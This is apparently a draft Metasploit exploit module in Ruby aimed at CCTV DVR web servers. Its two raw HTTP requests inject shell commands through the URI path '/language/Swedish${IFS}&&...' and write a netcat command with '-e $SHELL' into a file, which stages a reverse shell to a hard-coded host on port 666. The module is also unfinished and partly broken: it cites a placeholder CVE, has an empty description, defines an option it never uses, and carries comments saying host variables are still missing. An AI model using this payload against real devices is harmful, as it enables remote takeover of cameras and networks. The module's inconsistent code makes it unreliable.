##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient




	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'CCTV DVR Exploitation!',
			'Description'    => %q{
				CCTV DVR Exploitation!.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'todb'
				],
			'References'     =>
				[
					[ 'CVE', '1970-0001' ]
				],
			'Platform'          => [ 'linux' ],
			'Targets'        =>
				[
					['Universal', {}]
				],
			'DisclosureDate' => 'Mar 22 2016',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The output file name.', 'test.txt'])
			], self.class)

	end

	def exploit

		run
	end


def sendtwo()
		sleep(1)
	#            puts res.code
#            puts res.body
#need to add  host and port variables
string = '/language/Swedish${IFS}&&echo${IFS}"-e${IFS}$SHELL${IFS}">>f&&${IFS}/a'
puts "sending two"

        res2 =      send_request_raw({
        					'uri'=>"#{string}",
        	        		'agent' => '-'
        	})
puts "sent"

#        puts res2.body
#need to add target url
rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused       		
	puts "ignore error"
end

	def sendone()
			    print ("test")
            uri = target_uri.path

#            res = send_request_cgi({
#                'method'   => 'GET',
#                'uri'      => normalize_uri(uri, '/'),
#            })
		host = "192.168.0.1"
		port = "666"
       res =      send_request_raw({
       	'uri'=>"/language/Swedish${IFS}&&echo${IFS}nc${IFS}#{host}${IFS}#{port}${IFS}>f&&${IFS}/a",
       	'agent' => '',
       	'Accept-Encoding' => 'identity'

       	})
       #sendtwo
       puts "testing"
rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused       		
	puts "ignore error"
end



def run
begin
sendone
sendtwo




end


end
end
